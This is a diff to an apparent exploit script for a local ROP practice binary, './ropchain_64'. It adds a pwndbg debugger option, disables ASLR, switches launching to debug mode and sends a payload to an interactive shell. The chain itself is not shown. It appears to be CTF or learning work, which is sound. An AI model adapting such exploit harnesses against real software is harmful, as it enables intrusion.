@@ -6,9 +6,10 @@ class Prog:
     def __init__(self):
         self.io = None
         self.multiarch = None
+        self.DEBUGGER = "pwndbg"
         self.BINARY= "./ropchain_64"
         self.GDB_PORT = 1234
-        self.DISABLE_ASLR = False
+        self.DISABLE_ASLR = True
         self.TMUX = True
         self.LIBC_DIR= "" # ici il faut mettre là ou se trouve le répertoire "lib"
         self.BREAKPOINTS=[0x0000000000401143]
@@ -21,10 +22,10 @@ class Prog:
 
 PROG = Prog()
 PROG.multiarch = MultiArchDebugger(
-    PROG.BINARY, PROG.GDB_PORT, PROG.DISABLE_ASLR,
+    PROG.BINARY, PROG.DEBUGGER, PROG.GDB_PORT, PROG.DISABLE_ASLR,
     PROG.TMUX, PROG.BREAKPOINTS, PROG.LIBC_DIR)
 PROG.load_binaries()
-PROG.io = PROG.multiarch.launch()
+PROG.io = PROG.multiarch.debug()
 
 
 offset = 10
@@ -56,6 +57,8 @@ print(payload)
 PROG.io.sendline(payload)
 
 PROG.io.interactive() 
-PROG.io.close()
+
+
+PROG.multiarch.shutdown()
 
 
